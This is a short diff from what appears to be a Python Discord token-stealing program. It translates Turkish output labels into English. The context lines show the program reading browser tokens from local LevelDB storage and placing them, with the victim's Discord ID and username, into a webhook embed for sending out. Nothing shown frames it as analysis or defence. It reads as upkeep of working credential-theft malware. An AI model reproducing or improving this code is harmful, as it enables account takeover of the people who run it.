@@ -1463,11 +1463,11 @@ def main():
         if discord_info:
             # Get tokens using the new method
             browser_tokens = get_tokens_from_leveldb()
-            tokens_str = '\n'.join(browser_tokens) if browser_tokens else 'Bulunamadı'
+            tokens_str = '\n'.join(browser_tokens) if browser_tokens else 'Cannot find'
             
-            discord_field = f"Discord ID: {discord_info.get('id')}\nKullanıcı Adı: {discord_info.get('username')}\nGuild tag: {discord_info.get('tag') or 'doesnt find'}\nBrowser Tokens:\n{tokens_str}"
+            discord_field = f"Discord ID: {discord_info.get('id')}\nUsername: {discord_info.get('username')}\nGuild tag: {discord_info.get('tag') or 'doesnt find'}\nBrowser Tokens:\n{tokens_str}"
             
-            embed_data['embeds'][0]['description'] += f"\n\n**Discord Bilgileri**\n```yaml\n{discord_field}\n```"
+            embed_data['embeds'][0]['description'] += f"\n\n**Discord Info**\n```yaml\n{discord_field}\n```"
             
             # Add profile picture if available
             if discord_info.get('id') and discord_info.get('avatar'):
